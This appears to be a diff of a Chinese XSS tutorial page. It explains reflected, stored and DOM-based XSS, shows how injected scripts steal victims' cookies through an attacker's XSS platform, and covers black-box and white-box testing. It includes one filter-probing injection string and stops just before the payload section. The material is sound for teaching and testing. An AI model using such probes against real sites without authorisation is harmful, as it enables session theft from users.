 <p>&#x653B;&#x51FB;&#x8005;&#x8BF1;&#x5BFC;&#x53D7;&#x5BB3;&#x8005;&#x70B9;&#x51FB;&#x5305;&#x542B;&#x6076;&#x610F;JavaSctipt&#x4EE3;&#x7801;&#x7684;URL&#xFF0C;&#x5F53;&#x53D7;&#x5BB3;&#x8005;&#x70B9;&#x51FB;&#x8FD9;&#x4E9B;&#x7CBE;&#x5FC3;&#x8BBE;&#x8BA1;&#x7684;&#x94FE;&#x63A5;&#x540E;&#xFF0C;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x4F1A;&#x76F4;&#x63A5;&#x5728;&#x53D7;&#x5BB3;&#x8005;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x6267;&#x884C;&#xFF1B;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x5E76;&#x6CA1;&#x6709;&#x4FDD;&#x5B58;&#x5728;&#x76EE;&#x6807;&#x7F51;&#x7AD9;&#xFF0C;&#x800C;Web&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53EA;&#x662F;&#x4E0D;&#x52A0;&#x5904;&#x7406;&#x7684;&#x628A;&#x8BE5;&#x6076;&#x610F;&#x811A;&#x672C;&#x201C;&#x53CD;&#x5C04;&#x201D;&#x56DE;&#x53D7;&#x5BB3;&#x8005;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x800C;&#x4F7F;&#x53D7;&#x5BB3;&#x8005;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x6267;&#x884C;&#x76F8;&#x5E94;&#x7684;&#x811A;&#x672C;</p>
 <p>&#x4E00;&#x56FE;&#x80DC;&#x5343;&#x8A00;</p>
-<p><a href="README.assets/1635735254568-5a8e1934-eff9-49ae-9749-34c14666f1d5.png" data-lightbox="1347373d-879a-4c47-acdf-23b6ab672719" data-title="img"><img src="README.assets/1635735254568-5a8e1934-eff9-49ae-9749-34c14666f1d5.png" alt="img"></a></p>
+<p><a href="README.assets/1635735254568-5a8e1934-eff9-49ae-9749-34c14666f1d5.png" data-lightbox="3768cbc2-3540-44d9-a3fe-5eba16f5c139" data-title="img"><img src="README.assets/1635735254568-5a8e1934-eff9-49ae-9749-34c14666f1d5.png" alt="img"></a></p>
 <p>&#x5177;&#x4F53;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
 <ol>
 <li>&#x653B;&#x51FB;&#x8005;&#x5C06;payload&#x653E;&#x7F6E;&#x5728;url&#x94FE;&#x63A5;&#x4E2D;&#xFF08;&#x8FD9;&#x662F;&#x9488;&#x5BF9;&#x662F;GET&#x578B;&#x53CD;&#x5C04;XSS&#xFF09;</li>
@@ -4874,7 +4794,7 @@
 <li>&#x5BA2;&#x6237;&#x7AEF;&#x89E3;&#x6790;&#x89C6;&#x56FE;&#x4EE5;&#x53CA;XSS&#x4EE3;&#x7801;&#xFF08;JavaScript&#x4EE3;&#x7801;&#xFF09;&#xFF0C;&#x5E76;&#x5C06;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x53D1;&#x9001;&#x5230;XSS&#x5E73;&#x53F0;</li>
 <li>&#x653B;&#x51FB;&#x8005;&#x8BBF;&#x95EE;XSS&#x5E73;&#x53F0;&#xFF0C;&#x8BFB;&#x53D6;&#x7528;&#x6237;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;&#xFF08;Cookie&#xFF09;</li>
 </ol>
-<h3 id="&#x5B58;&#x50A8;&#x578B;xss"><a name="&#x5B58;&#x50A8;&#x578B;xss" class="anchor-navigation-ex-anchor" href="#&#x5B58;&#x50A8;&#x578B;xss"><i class="fa fa-link" aria-hidden="true"></i></a>1.3.2. &#x5B58;&#x50A8;&#x578B;XSS</h3>
+<h3 id="&#x5B58;&#x50A8;&#x578B;xss">&#x5B58;&#x50A8;&#x578B;XSS</h3>
 <blockquote>
 <p>[!NOTE]</p>
 <p>payload&#x4F1A;&#x5B58;&#x5728;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x9762;&#xFF0C;&#x4E00;&#x822C;&#x51FA;&#x73B0;&#x5728;&#x4F1A;&#x5C06;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x5E76;&#x5C55;&#x793A;&#x5728;&#x524D;&#x7AEF;&#x9875;&#x9762;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5982;&#x6CE8;&#x518C;&#x9875;&#x3001;&#x7559;&#x8A00;&#x677F;&#x7B49;</p>
@@ -4882,7 +4802,7 @@
 <p>&#x5B58;&#x50A8;&#x578B;XSS&#x662F;&#x6307;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5C06;&#x5B58;&#x5728;XSS payload&#x7684;&#x6570;&#x636E;&#x672A;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x68C0;&#x67E5;&#x4FBF;&#x5B58;&#x5165;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x5F53;&#x4E0B;&#x4E00;&#x6B21;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x83B7;&#x53D6;&#x8BE5;&#x6570;&#x636E;&#x65F6;&#x7A0B;&#x5E8F;&#x4E5F;&#x672A;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#xFF0C;&#x76F4;&#x63A5;&#x5C06;&#x5176;&#x5C55;&#x793A;&#x5728;&#x524D;&#x7AEF;&#xFF0C;&#x9875;&#x9762;&#x5C06;&#x4F1A;&#x6267;&#x884C;XSS payload&#x653B;&#x51FB;&#x7528;&#x6237;&#x3002;</p>
 <p>&#x653B;&#x51FB;&#x8005;&#x4E8B;&#x5148;&#x5C06;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x4E0A;&#x4F20;&#x6216;&#x50A8;&#x5B58;&#x5230;&#x6F0F;&#x6D1E;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#xFF0C;&#x53EA;&#x8981;&#x53D7;&#x5BB3;&#x8005;&#x6D4F;&#x89C8;&#x5305;&#x542B;&#x6B64;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x7684;&#x9875;&#x9762;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x3002;&#x8FD9;&#x5C31;&#x610F;&#x5473;&#x7740;&#x53EA;&#x8981;&#x8BBF;&#x95EE;&#x4E86;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x8BBF;&#x5BA2;&#xFF0C;&#x90FD;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x6267;&#x884C;&#x8FD9;&#x6BB5;&#x6076;&#x610F;&#x811A;&#x672C;&#xFF0C;&#x56E0;&#x6B64;&#x50A8;&#x5B58;&#x578B;XSS&#x7684;&#x5371;&#x5BB3;&#x4F1A;&#x66F4;&#x5927;&#x3002;</p>
 <p>&#x5B58;&#x50A8;&#x578B;XSS&#x6F0F;&#x6D1E;&#x5927;&#x591A;&#x51FA;&#x73B0;&#x5728;&#x7559;&#x8A00;&#x677F;&#x3001;&#x8BC4;&#x8BBA;&#x533A;&#x7B49;&#x4F1A;&#x5B58;&#x653E;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4E14;&#x4F1A;&#x5728;&#x67D0;&#x4E9B;&#x5730;&#x65B9;&#x5C55;&#x793A;&#x8BE5;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;&#x70B9;&#xFF0C;&#x7528;&#x6237;&#x63D0;&#x4EA4;&#x4E86;&#x5305;&#x542B;XSS&#x4EE3;&#x7801;&#x7684;&#x7559;&#x8A00;&#x5230;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5F53;&#x76EE;&#x6807;&#x7528;&#x6237;&#x67E5;&#x8BE2;&#x7559;&#x8A00;&#x65F6;&#xFF0C;&#x90A3;&#x4E9B;&#x7559;&#x8A00;&#x7684;&#x5185;&#x5BB9;&#x4F1A;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;&#x5230;&#x524D;&#x7AEF;&#x5E76;&#x6267;&#x884C;&#x6076;&#x610F;&#x7684;XSS payload</p>
-<p><a href="README.assets/1635736030278-9271481e-bff1-4c35-b5ee-606756510367.png" data-lightbox="da07581b-9a3e-4ea7-8df0-b6e77b2fa293" data-title="img"><img src="README.assets/1635736030278-9271481e-bff1-4c35-b5ee-606756510367.png" alt="img"></a></p>
+<p><a href="README.assets/1635736030278-9271481e-bff1-4c35-b5ee-606756510367.png" data-lightbox="5cd29b0f-72e7-4e82-842c-04be73528a34" data-title="img"><img src="README.assets/1635736030278-9271481e-bff1-4c35-b5ee-606756510367.png" alt="img"></a></p>
 <p>&#x5177;&#x4F53;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
 <ol>
 <li>&#x653B;&#x51FB;&#x8005;&#x5411;web&#x670D;&#x52A1;&#x63D2;&#x5165;XSS&#x4EE3;&#x7801;</li>
@@ -4892,7 +4812,7 @@
 <li>&#x5BA2;&#x6237;&#x7AEF;&#x6E32;&#x67D3;&#x89C6;&#x56FE;&#xFF0C;&#x52A0;&#x8F7D;XSS&#x4EE3;&#x7801;&#xFF0C;&#x5E76;&#x5411;&#x653B;&#x51FB;&#x8005;&#x7684;web&#x670D;&#x52A1;&#x53D1;&#x9001;&#x654F;&#x611F;&#x4FE1;&#x606F;</li>
 <li>&#x653B;&#x51FB;&#x8005;&#x8BFB;&#x53D6;&#x7528;&#x6237;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;</li>
 </ol>
-<h3 id="dom&#x578B;xss"><a name="dom&#x578B;xss" class="anchor-navigation-ex-anchor" href="#dom&#x578B;xss"><i class="fa fa-link" aria-hidden="true"></i></a>1.3.3. DOM&#x578B;XSS</h3>
+<h3 id="dom&#x578B;xss">DOM&#x578B;XSS</h3>
 <blockquote>
 <p>[!NOTE]</p>
 <p>&#x4E0D;&#x4E0E;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4EA4;&#x4E92;&#x6570;&#x636E;&#xFF0C;payload&#x4E0D;&#x4F1A;&#x5B58;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x4E5F;&#x5C5E;&#x4E8E;&#x53CD;&#x5C04;&#x578B;&#x7684;&#x4E00;&#x79CD;&#xFF0C;&#x901A;&#x8FC7;dom&#x64CD;&#x4F5C;&#x524D;&#x7AEF;&#x8F93;&#x51FA;&#x7684;&#x65F6;&#x5019;&#x4EA7;&#x751F;&#x95EE;&#x9898;&#xFF08;&#x76F8;&#x6BD4;&#x4E8E;&#x524D;&#x4E24;&#x79CD;&#x8F83;&#x96BE;&#x6316;&#x6398;&#xFF0C;&#x9700;&#x8981;&#x719F;&#x6089;&#x57FA;&#x7840;&#x7684;js&#x4EE3;&#x7801;&#xFF09;</p>
@@ -4900,7 +4820,7 @@
 <p>DOM&#xFF0C;&#x5168;&#x79F0;<code>Document Object Model</code>&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x5E73;&#x53F0;&#x548C;&#x8BED;&#x8A00;&#x90FD;&#x4E2D;&#x7ACB;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7A0B;&#x5E8F;&#x548C;&#x811A;&#x672C;&#x80FD;&#x591F;&#x52A8;&#x6001;&#x8BBF;&#x95EE;&#x548C;&#x66F4;&#x65B0;&#x6587;&#x6863;&#x7684;&#x5185;&#x5BB9;&#x3001;&#x7ED3;&#x6784;&#x4EE5;&#x53CA;&#x6837;&#x5F0F;</p>
 <p>&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x53EF;&#x4EE5;&#x52A8;&#x6001;&#x5730;&#x68C0;&#x67E5;&#x548C;&#x4FEE;&#x6539;&#x9875;&#x9762;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x4E0D;&#x4F9D;&#x8D56;&#x4E8E;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7684;&#x6570;&#x636E;&#x3002;&#x4F8B;&#x5982;&#x5BA2;&#x6237;&#x7AEF;&#x5982;&#x4ECE;URL&#x4E2D;&#x63D0;&#x53D6;&#x6570;&#x636E;&#x5E76;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#xFF0C;&#x5982;&#x679C;&#x7528;&#x6237;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x8F93;&#x5165;&#x7684;&#x6570;&#x636E;&#x5305;&#x542B;&#x4E86;&#x6076;&#x610F;&#x7684;JavaScript&#x811A;&#x672C;&#xFF0C;&#x800C;&#x8FD9;&#x4E9B;&#x811A;&#x672C;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x8FC7;&#x6EE4;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5C31;&#x53EF;&#x80FD;&#x53D7;&#x5230;<code>DOM-based XSS</code>&#x653B;&#x51FB;&#x3002;</p>
 <p>&#x9700;&#x8981;&#x7279;&#x522B;&#x6CE8;&#x610F;&#x4EE5;&#x4E0B;&#x7684;&#x7528;&#x6237;&#x8F93;&#x5165;&#x6E90; <code>document.URL</code>&#x3001;<code>location.hash</code>&#x3001;<code>location.search</code>&#x3001;<code>document.referrer</code> &#x7B49;</p>
-<p><a href="README.assets/1635736881859-377bc324-ed39-4b48-afe3-270da5f9616e.png" data-lightbox="ba2979e0-6bdd-4b0b-9632-4baf294f4549" data-title="img"><img src="README.assets/1635736881859-377bc324-ed39-4b48-afe3-270da5f9616e.png" alt="img"></a></p>
+<p><a href="README.assets/1635736881859-377bc324-ed39-4b48-afe3-270da5f9616e.png" data-lightbox="5b301765-f465-4156-8d99-71fc0af6f7ee" data-title="img"><img src="README.assets/1635736881859-377bc324-ed39-4b48-afe3-270da5f9616e.png" alt="img"></a></p>
 <p>&#x5177;&#x4F53;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
 <ol>
 <li>&#x653B;&#x51FB;&#x8005;&#x5C06;payload&#x653E;&#x7F6E;&#x5728;url&#x94FE;&#x63A5;&#x4E2D;&#xFF08;&#x8FD9;&#x662F;&#x9488;&#x5BF9;&#x662F;GET&#x578B;&#x53CD;&#x5C04;XSS&#xFF09;</li>
@@ -4909,8 +4829,8 @@
 <li>&#x6B64;&#x65F6;&#x5C06;XSS&#x4EE3;&#x7801;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x53D1;&#x9001;&#x7ED9;&#x653B;&#x51FB;&#x8005;&#x7684;&#x6076;&#x610F;&#x670D;&#x52A1;</li>
 <li>&#x653B;&#x51FB;&#x8005;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;XSS&#x5E73;&#x53F0;&#x5E76;&#x8BFB;&#x53D6;&#x7528;&#x6237;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;</li>
 </ol>
-<h2 id="&#x5404;xss&#x533A;&#x522B;"><a name="&#x5404;xss&#x533A;&#x522B;" class="anchor-navigation-ex-anchor" href="#&#x5404;xss&#x533A;&#x522B;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4. &#x5404;XSS&#x533A;&#x522B;</h2>
-<h3 id="&#x57FA;&#x7840;&#x5BF9;&#x6BD4;"><a name="&#x57FA;&#x7840;&#x5BF9;&#x6BD4;" class="anchor-navigation-ex-anchor" href="#&#x57FA;&#x7840;&#x5BF9;&#x6BD4;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.1. &#x57FA;&#x7840;&#x5BF9;&#x6BD4;</h3>
+<h2 id="&#x5404;xss&#x533A;&#x522B;">&#x5404;XSS&#x533A;&#x522B;</h2>
+<h3 id="&#x57FA;&#x7840;&#x5BF9;&#x6BD4;">&#x57FA;&#x7840;&#x5BF9;&#x6BD4;</h3>
 <table>
 <thead>
 <tr>
@@ -4941,14 +4861,14 @@
 </tr>
 </tbody>
 </table>
-<h3 id="&#x53CD;&#x5C04;&#x578B;xss&#x4E0E;dom&#x578B;xss&#x533A;&#x522B;"><a name="&#x53CD;&#x5C04;&#x578B;xss&#x4E0E;dom&#x578B;xss&#x533A;&#x522B;" class="anchor-navigation-ex-anchor" href="#&#x53CD;&#x5C04;&#x578B;xss&#x4E0E;dom&#x578B;xss&#x533A;&#x522B;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.2. &#x53CD;&#x5C04;&#x578B;XSS&#x4E0E;DOM&#x578B;XSS&#x533A;&#x522B;</h3>
+<h3 id="&#x53CD;&#x5C04;&#x578B;xss&#x4E0E;dom&#x578B;xss&#x533A;&#x522B;">&#x53CD;&#x5C04;&#x578B;XSS&#x4E0E;DOM&#x578B;XSS&#x533A;&#x522B;</h3>
 <p>1&#x3001;&#x53CD;&#x5C04;&#x578B;XSS&#x653B;&#x51FB;&#x4E2D;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5728;&#x8FD4;&#x56DE;HTML&#x6587;&#x6863;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x5DF2;&#x7ECF;&#x5305;&#x542B;&#x4E86;&#x6076;&#x610F;&#x7684;&#x811A;&#x672C;;</p>
 <p>2&#x3001;DOM&#x578B;&#x2169;SS&#x653B;&#x51FB;&#x4E2D;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5728;&#x8FD4;&#x56DE;HTML&#x6587;&#x6863;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x662F;&#x4E0D;&#x5305;&#x542B;&#x6076;&#x610F;&#x811A;&#x672C;&#x7684;&#xFF1B;&#x6076;&#x610F;&#x811A;&#x672C;&#x662F;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x6267;&#x884C;&#x4E86;&#x6B63;&#x5E38;&#x811A;&#x672C;&#x540E;&#xFF0C;&#x624D;&#x88AB;&#x6CE8;&#x5165;&#x5230;&#x6587;&#x6863;&#x91CC;&#x7684;</p>
 <blockquote>
 <p>[!TIP]</p>
 <p>&#x4E00;&#x53E5;&#x8BDD;&#x533A;&#x5206;&#xFF1A;&#x53CD;&#x5C04;&#x578B;XSS&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5728;&#x670D;&#x52A1;&#x7AEF;&#x8FD4;&#x56DE;&#x7684;html&#x4E2D;&#x770B;&#x5230;payload&#xFF0C;&#x800C;DOM&#x578B;XSS&#x4E0D;&#x884C;</p>
 </blockquote>
-<h3 id="xss&#x4E0E;csrf&#x7684;&#x533A;&#x522B;"><a name="xss&#x4E0E;csrf&#x7684;&#x533A;&#x522B;" class="anchor-navigation-ex-anchor" href="#xss&#x4E0E;csrf&#x7684;&#x533A;&#x522B;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.3. XSS&#x4E0E;CSRF&#x7684;&#x533A;&#x522B;</h3>
+<h3 id="xss&#x4E0E;csrf&#x7684;&#x533A;&#x522B;">XSS&#x4E0E;CSRF&#x7684;&#x533A;&#x522B;</h3>
 <blockquote>
 <p>&#x9762;&#x8BD5;&#x5E38;&#x95EE;</p>
 </blockquote>
@@ -4970,8 +4890,8 @@
 </tr>
 </tbody>
 </table>
-<h2 id="xss&#x6316;&#x6398;"><a name="xss&#x6316;&#x6398;" class="anchor-navigation-ex-anchor" href="#xss&#x6316;&#x6398;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5. XSS&#x6316;&#x6398;</h2>
-<h3 id="&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;"><a name="&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;" class="anchor-navigation-ex-anchor" href="#&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.1. &#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;</h3>
+<h2 id="xss&#x6316;&#x6398;">XSS&#x6316;&#x6398;</h2>
+<h3 id="&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;">&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;</h3>
 <ol>
 <li><p>&#x5206;&#x6790;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x6240;&#x6709;&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x90FD;&#x53EF;&#x4EE5;&#x8F93;&#x5165;payload&#x8FDB;&#x884C;&#x5C1D;&#x8BD5;&#xFF0C;&#x4E00;&#x822C;&#x53EF;&#x4EE5;&#x5148;&#x8F93;&#x5165;&#x4E00;&#x4E9B;&#x5E38;&#x89C4;&#x6807;&#x7B7E;&#x5982;<code>h1</code>&#x3001;<code>img</code>&#x7B49;&#x8FDB;&#x884C;&#x786E;&#x8BA4;</p>
 <ol>
@@ -4995,7 +4915,7 @@
 <p>[!TIP]
 &#x53EF;&#x4EE5;&#x7EF4;&#x62A4;&#x4E00;&#x4E2A;XSS&#x7684;Fuzz&#x5B57;&#x5178;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x5FEB;&#x901F;&#x8F85;&#x52A9;&#x53D1;&#x73B0;XSS&#x6F0F;&#x6D1E;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x4E00;&#x4E2A;&#x624B;&#x52A8;&#x53BB;&#x8F93;&#x5165;</p>
 </blockquote>
-<h3 id="&#x767D;&#x76D2;&#x6D4B;&#x8BD5;"><a name="&#x767D;&#x76D2;&#x6D4B;&#x8BD5;" class="anchor-navigation-ex-anchor" href="#&#x767D;&#x76D2;&#x6D4B;&#x8BD5;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.2. &#x767D;&#x76D2;&#x6D4B;&#x8BD5;</h3>
+<h3 id="&#x767D;&#x76D2;&#x6D4B;&#x8BD5;">&#x767D;&#x76D2;&#x6D4B;&#x8BD5;</h3>
 <p>&#x5173;&#x4E8E;XSS&#x7684;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x4E3B;&#x8981;&#x5C31;&#x662F;&#x4ECE;&#x63A5;&#x6536;&#x53C2;&#x6570;&#x7684;&#x5730;&#x65B9;&#x548C;&#x4E00;&#x4E9B;&#x5173;&#x952E;&#x8BCD;&#x5165;&#x624B;&#x3002;</p>
 <ul>
 <li>PHP&#x4E2D;&#x5E38;&#x89C1;&#x7684;&#x63A5;&#x6536;&#x53C2;&#x6570;&#x7684;&#x65B9;&#x5F0F;&#x6709;<code>$_GET</code>&#x3001;<code>$_POST</code>&#x3001;<code>$_REQUEST</code>&#x7B49;&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x6240;&#x6709;&#x63A5;&#x6536;&#x53C2;&#x6570;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x63A5;&#x6536;&#x5230;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x8DDF;&#x8E2A;&#xFF0C;&#x770B;&#x770B;&#x6709;&#x6CA1;&#x6709;&#x8F93;&#x51FA;&#x5230;&#x9875;&#x9762;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x770B;&#x8F93;&#x51FA;&#x5230;&#x9875;&#x9762;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x662F;&#x5426;&#x8FDB;&#x884C;&#x4E86;&#x8FC7;&#x6EE4;&#x548C;html&#x7F16;&#x7801;&#x7B49;&#x5904;&#x7406;&#x3002;</li>
@@ -5003,23 +4923,23 @@
 <li>&#x5927;&#x591A;&#x6570;&#x7A0B;&#x5E8F;&#x4F1A;&#x5BF9;&#x63A5;&#x6536;&#x53C2;&#x6570;&#x5C01;&#x88C5;&#x5728;&#x516C;&#x5171;&#x6587;&#x4EF6;&#x7684;&#x51FD;&#x6570;&#x4E2D;&#x7EDF;&#x4E00;&#x8C03;&#x7528;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x5BA1;&#x8BA1;&#x8FD9;&#x4E9B;&#x516C;&#x5171;&#x51FD;&#x6570;&#x770B;&#x6709;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;&#xFF0C;&#x80FD;&#x5426;&#x7ED5;&#x8FC7;&#x7B49;&#x7B49;&#x3002;</li>
 <li>&#x540C;&#x7406;&#x5BA1;&#x8BA1;DOM&#x578B;&#x6CE8;&#x5165;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x4E00;&#x4E9B;js&#x64CD;&#x4F5C;DOM&#x5143;&#x7D20;&#x7684;&#x5173;&#x952E;&#x8BCD;&#x8FDB;&#x884C;&#x5BA1;&#x8BA1;&#x3002;</li>
 </ul>
-<h3 id="&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;"><a name="&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;" class="anchor-navigation-ex-anchor" href="#&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.3. &#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;</h3>
+<h3 id="&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;">&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;</h3>
 <ul>
 <li><strong>&#x91CD;&#x707E;&#x533A;&#xFF1A;</strong>&#x8BC4;&#x8BBA;&#x533A;&#x3001;&#x7559;&#x8A00;&#x533A;&#x3001;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x3001;&#x8BA2;&#x5355;&#x4FE1;&#x606F;&#x7B49;</li>
 <li><strong>&#x9488;&#x5BF9;&#x578B;&#xFF1A;</strong>&#x7AD9;&#x5185;&#x4FE1;&#x3001;&#x7F51;&#x9875;&#x5373;&#x65F6;&#x901A;&#x8BAF;&#x3001;&#x79C1;&#x4FE1;&#x3001;&#x610F;&#x89C1;&#x53CD;&#x9988;</li>
 <li><strong>&#x5B58;&#x5728;&#x98CE;&#x9669;&#xFF1A;</strong>&#x641C;&#x7D22;&#x6846;&#x3001;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x3001;&#x56FE;&#x7247;&#x5C5E;&#x6027;&#x3001;&#x81EA;&#x5B9A;&#x4E49;&#x5934;&#x50CF;&#x94FE;&#x63A5;&#x7B49;</li>
 </ul>
-<h2 id="&#x5E38;&#x89C1;payload"><a name="&#x5E38;&#x89C1;payload" class="anchor-navigation-ex-anchor" href="#&#x5E38;&#x89C1;payload"><i class="fa fa-link" aria-hidden="true"></i></a>1.6. &#x5E38;&#x89C1;Payload</h2>
+<h2 id="&#x5E38;&#x89C1;payload">&#x5E38;&#x89C1;Payload</h2>
 <p>XSS&#x4E3B;&#x8981;&#x662F;&#x9488;&#x5BF9;&#x6D4F;&#x89C8;&#x5668;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x4E00;&#x79CD;&#x653B;&#x51FB;&#xFF0C;&#x9700;&#x8981;&#x6267;&#x884C;JavaScript&#x4EE3;&#x7801;&#xFF0C;&#x90A3;&#x4E48;&#x65E0;&#x7591;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x5230;JavaScript&#x8BED;&#x8A00;&#x4EE5;&#x53CA;&#x5728;HTML&#x4E2D;&#x53EF;&#x4EE5;&#x52A0;&#x8F7D;JavaScript&#x7684;&#x6807;&#x7B7E;</p>
-<h3 id="&#x901F;&#x67E5;&#x8868;"><a name="&#x901F;&#x67E5;&#x8868;" class="anchor-navigation-ex-anchor" href="#&#x901F;&#x67E5;&#x8868;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.1. &#x901F;&#x67E5;&#x8868;</h3>
+<h3 id="&#x901F;&#x67E5;&#x8868;">&#x901F;&#x67E5;&#x8868;</h3>
 <ul>
 <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></li>
 </ul>
-<h3 id="&#x63A2;&#x6D4B;&#x5668;"><a name="&#x63A2;&#x6D4B;&#x5668;" class="anchor-navigation-ex-anchor" href="#&#x63A2;&#x6D4B;&#x5668;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.2. &#x63A2;&#x6D4B;&#x5668;</h3>
+<h3 id="&#x63A2;&#x6D4B;&#x5668;">&#x63A2;&#x6D4B;&#x5668;</h3>
 <p>&#x5FEB;&#x901F;&#x67E5;&#x770B;&#x8FC7;&#x6EE4;&#x4E86;&#x54EA;&#x4E9B;&#x5B57;&#x7B26;</p>
 <pre class="language-"><code>&apos;&apos;;!--&quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>=&amp;{()}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
-</code></pre><h3 id="&#x5E38;&#x7528;&#x57FA;&#x7840;payload"><a name="&#x5E38;&#x7528;&#x57FA;&#x7840;payload" class="anchor-navigation-ex-anchor" href="#&#x5E38;&#x7528;&#x57FA;&#x7840;payload"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.3. &#x5E38;&#x7528;&#x57FA;&#x7840;payload</h3>
